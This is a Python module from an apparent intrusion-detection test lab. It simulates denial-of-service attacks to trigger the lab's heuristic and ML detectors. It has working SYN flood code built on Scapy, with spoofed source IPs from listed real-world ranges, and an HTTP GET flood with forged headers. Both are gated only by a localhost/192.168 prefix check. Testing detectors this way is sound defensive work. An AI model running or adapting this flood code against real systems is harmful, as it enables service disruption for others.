"""
attack_lab/scenarios/syn_flood.py
===================================
SYN Flood / DDoS Attack Simulator

Simulates volumetric SYN flood attacks that trigger:
  - Heuristic Engine: SYN count threshold exceeded
  - ML Engine: DDoS model activated via high SYN/packet rate
  - MITRE: T1499 — Endpoint Denial of Service

⚠️  FOR LOCALHOST LAB USE ONLY
"""

import time
import random
import logging
import threading

log = logging.getLogger("sentinel.attack_lab.synflood")

ALLOWED_TARGETS = ["127.0.0.1", "localhost", "192.168."]


def _safety_check(target: str):
    allowed = any(target.startswith(a) or target == a for a in ALLOWED_TARGETS)
    if not allowed:
        raise ValueError(f"[SAFETY] Target {target} blocked. Only localhost allowed.")


def syn_flood_scapy(target: str = "127.0.0.1",
                    target_port: int = 5001,
                    count: int = 500,
                    delay: float = 0.002,
                    spoof_ip: bool = True,
                    verbose: bool = True) -> dict:
    """
    Raw SYN flood using Scapy.
    Sends SYN packets rapidly without completing TCP handshake.
    Spoofs source IPs from realistic ranges to trigger GeoIP map dots.
    """
    _safety_check(target)

    try:
        from scapy.all import IP, TCP, send, conf
        conf.verb = 0
    except ImportError:
        log.warning("[SYNFlood] Scapy not available. Cannot run SYN flood.")
        return {"error": "Scapy required for SYN flood", "sent": 0}

    # Realistic attacker IP ranges (for GeoIP map visualization)
    SPOOF_RANGES = [
        "1.180.",    # China
        "5.188.",    # Russia
        "23.95.",    # US
        "31.13.",    # Europe
        "45.33.",    # Linode (common DDoS source)
        "80.82.",    # Netherlands
        "103.21.",   # Southeast Asia
        "138.68.",   # DigitalOcean
        "185.220.",  # Tor exit node range
        "221.228.",  # China Telecom
    ]

    def rand_spoof_ip() -> str:
        prefix = random.choice(SPOOF_RANGES)
        return f"{prefix}{random.randint(1,254)}.{random.randint(1,254)}"

    sent = 0
    start = time.time()

    if verbose:
        log.info(f"[SYNFlood] Starting → {target}:{target_port} | {count} packets | spoof={spoof_ip}")

    for i in range(count):
        try:
            src_ip = rand_spoof_ip() if spoof_ip else "127.0.0.1"
            pkt = (
                IP(src=src_ip, dst=target) /
                TCP(
                    sport=random.randint(1024, 65534),
                    dport=target_port,
                    flags="S",
                    seq=random.randint(1000, 9999999),
                    window=random.randint(1024, 65535)
                )
            )
            send(pkt, verbose=0)
            sent += 1
        except Exception as e:
            log.debug(f"[SYNFlood] Packet error: {e}")

        time.sleep(delay)

    elapsed = time.time() - start
    pps = sent / elapsed if elapsed > 0 else 0

    if verbose:
        log.info(f"[SYNFlood] Done: {sent} packets in {elapsed:.2f}s ({pps:.0f} pps)")

    return {"sent": sent, "duration": round(elapsed, 2), "pps": round(pps, 1)}


def http_flood(target: str = "127.0.0.1",
               target_port: int = 5001,
               count: int = 200,
               delay: float = 0.01,
               verbose: bool = True) -> dict:
    """
    HTTP GET flood — sends rapid HTTP requests to overwhelm the target.
    Triggers heuristic rate detection and DDoS ML model.
    """
    _safety_check(target)
    import urllib.request
    import urllib.error

    sent = 0
    errors = 0
    url = f"http://{target}:{target_port}/"

    if verbose:
        log.info(f"[HTTPFlood] Starting → {url} | {count} requests")

    for i in range(count):
        try:
            req = urllib.request.Request(url, headers={
                "User-Agent": f"FloodBot/{random.randint(1,99)}",
                "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}",
            })
            urllib.request.urlopen(req, timeout=1)
            sent += 1
        except Exception:
            errors += 1
        time.sleep(delay)

    if verbose:
        log.info(f"[HTTPFlood] Done: {sent} sent, {errors} errors")
    return {"sent": sent, "errors": errors}


def run(mode: str = "syn", target: str = "127.0.0.1",
        port: int = 5001, count: int = 300, verbose: bool = True):
    """Entry point for attack launcher."""
    if mode == "http":
        return http_flood(target, port, count, verbose=verbose)
    else:
        return syn_flood_scapy(target, port, count, verbose=verbose)
